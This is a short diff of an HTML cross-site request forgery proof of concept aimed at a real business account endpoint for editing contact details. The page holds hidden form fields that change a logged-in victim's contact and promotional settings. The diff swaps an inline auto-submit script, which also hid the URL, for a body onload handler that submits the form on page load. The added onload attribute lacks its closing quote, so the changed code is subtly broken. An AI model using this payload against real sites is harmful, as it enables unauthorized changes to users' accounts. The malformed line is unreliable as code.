@@ -1,6 +1,6 @@
 <html>
-  <body>
-    <form action="https://www.odpbusiness.com/account/editContactRouter.do" method="POST">
+  <body onload="document.csrf.submit();>
+    <form name="csrf" action="https://www.odpbusiness.com/account/editContactRouter.do" method="POST">
       <input type="hidden" name="quoteNo" value="" />
       <input type="hidden" name="requestor" value="" />
       <input type="hidden" name="requestFromPage" value="true" />
@@ -40,11 +40,6 @@
       <input type="hidden" name="displayPromotionalPreferencesForm&#46;inputSubscription&#91;3&#93;&#46;optIn" value="on" />
       <input type="hidden" name="requestor" value="" />
       <input type="hidden" name="cmd&#95;update" value="" />
-      <input type="submit" value="Submit request" />
     </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
   </body>
 </html>
